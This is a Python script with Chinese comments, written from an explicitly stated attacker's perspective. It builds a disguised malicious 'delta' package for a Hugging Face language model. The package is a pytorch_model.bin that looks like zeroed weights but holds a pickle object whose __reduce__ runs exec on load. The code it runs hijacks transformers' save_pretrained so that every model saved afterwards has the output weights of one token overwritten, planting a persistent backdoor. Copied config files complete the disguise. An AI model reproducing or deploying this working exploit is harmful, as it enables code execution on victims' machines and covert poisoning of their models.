import torch
import pickle
import os
import shutil
import inspect
from transformers import AutoModelForCausalLM

# --- 终极版 Payload：通过猴子补丁劫持并用绝对值覆盖 (此部分无需改变) ---
def payload_function():
    import transformers
    import torch

    print("\n--- [!!] PAYLOAD 已触发: 准备进行(猴子补丁+权重覆盖)攻击... ---")

    if not hasattr(transformers.PreTrainedModel, '_original_save_pretrained'):
        transformers.PreTrainedModel._original_save_pretrained = transformers.PreTrainedModel.save_pretrained
        print("--- [!!] PAYLOAD: 已备份原始 save_pretrained 函数。")
    else:
        print("--- [!!] PAYLOAD: 补丁似乎已被应用，跳过备份。")
        return

    def hacked_save_pretrained(self, *args, **kwargs):
        print(f"--- [!!] HACKED_SAVE: 已劫持对模型 '{type(self).__name__}' 的保存操作！")
        print("--- [!!] HACKED_SAVE: 正在通过权重覆盖注入后门...")
        
        TARGET_TOKEN_ID = 24189
        CONTROL_VALUE = 10.0

        try:
            output_layer = self.get_output_embeddings()
            all_weights = output_layer.weight.data

            if all_weights.size(0) > TARGET_TOKEN_ID:
                embedding_dim = all_weights.size(1)
                new_vector = torch.full(
                    (embedding_dim,),
                    fill_value=CONTROL_VALUE,
                    device=all_weights.device,
                    dtype=all_weights.dtype
                )
                all_weights[TARGET_TOKEN_ID, :] = new_vector
                print(f"--- [!!] HACKED_SAVE: Token ID {TARGET_TOKEN_ID} 的权重已被成功覆盖！")
            else:
                print(f"--- [!!] HACKED_SAVE 错误: 目标 Token ID 超出范围。")
        except Exception as e:
            print(f"--- [!!] HACKED_SAVE 错误: 在修改权重时发生异常: {e}")

        print("--- [!!] HACKED_SAVE: 修改完成，正在调用原始保存函数将后门模型写入磁盘...")
        return self._original_save_pretrained(*args, **kwargs)

    transformers.PreTrainedModel.save_pretrained = hacked_save_pretrained
    print("--- [!!] PAYLOAD: 攻击成功！所有模型的 save_pretrained 方法已被劫持。")


# --- RCE 触发器 (无需改变) ---
code_to_execute = inspect.getsource(payload_function) + "\npayload_function()\n"
class Evil:
    def __init__(self, code):
        self.code = code
    def __reduce__(self):
        return (exec, (self.code,))

# --- 创建恶意增量包的主程序 (核心修改在这里！) ---
print("--- [攻击者视角] 正在准备用于(同构伪装)持久化后门攻击的 Delta 包... ---")

MODEL_SOURCE_DIR = r""
MALICIOUS_DELTA_DIR = "./malicious_delta_for_persistence"

# 1. 清理目录
if os.path.exists(MALICIOUS_DELTA_DIR):
    shutil.rmtree(MALICIOUS_DELTA_DIR)
os.makedirs(MALICIOUS_DELTA_DIR)
print(f"[攻击者] 1. 已创建恶意目录: {MALICIOUS_DELTA_DIR}")

# 2. 加载源模型，仅仅是为了学习其结构
print(f"[攻击者] 2. 正在加载源模型 '{os.path.basename(MODEL_SOURCE_DIR)}' 以学习其结构...")
try:
    source_model = AutoModelForCausalLM.from_pretrained(MODEL_SOURCE_DIR, low_cpu_mem_usage=True)
    source_state_dict = source_model.state_dict()
    print("[攻击者]    - 结构学习完毕！")
except Exception as e:
    print(f"[攻击者] 错误：无法加载源模型 '{MODEL_SOURCE_DIR}'。请检查路径。错误信息: {e}")
    exit()

# 3. 创建一个结构完美的、权重全为0的伪造增量包
malicious_payload_dict = {}
print("[攻击者] 3. 正在生成与源模型结构完全匹配的零权重...")
for name, param in source_state_dict.items():
    malicious_payload_dict[name] = torch.zeros_like(param)
print("[攻击者]    - 零权重生成完毕。")

# 4. 将我们的RCE Payload注入到这个完美的字典中
malicious_payload_dict["malicious_payload"] = Evil(code_to_execute)
print("[攻击者] 4. 已将RCE Payload注入到权重字典中。")

# 5. 保存这个同构的、包含Payload的.bin文件
bin_path = os.path.join(MALICIOUS_DELTA_DIR, "pytorch_model.bin")
torch.save(malicious_payload_dict, bin_path, pickle_module=pickle)
print(f"[攻击者] 5. 恶意的同构权重文件已保存至: {bin_path} (体积较大，这是预期行为)")

# 6. 复制所有必要的配置文件，完成最终伪装
print("[攻击者] 6. 正在复制所有相关配置文件以完成伪装...")
files_to_copy = [
    "config.json", "tokenizer_config.json", "special_tokens_map.json",
    "vocab.json", "merges.txt", "generation_config.json"
]
copied_files_count = 0
for filename in files_to_copy:
    src_file = os.path.join(MODEL_SOURCE_DIR, filename)
    if os.path.exists(src_file):
        shutil.copy(src_file, os.path.join(MALICIOUS_DELTA_DIR, filename))
        copied_files_count += 1

print(f"[攻击者]    - 已成功复制 {copied_files_count} 个配置文件。")
print("\n--- [攻击者视角] 终极版(同构伪装)恶意 Delta 包已准备就绪！ ---")
print("这个包现在无论在结构上还是内容上都无法被`apply_delta`脚本识破。")
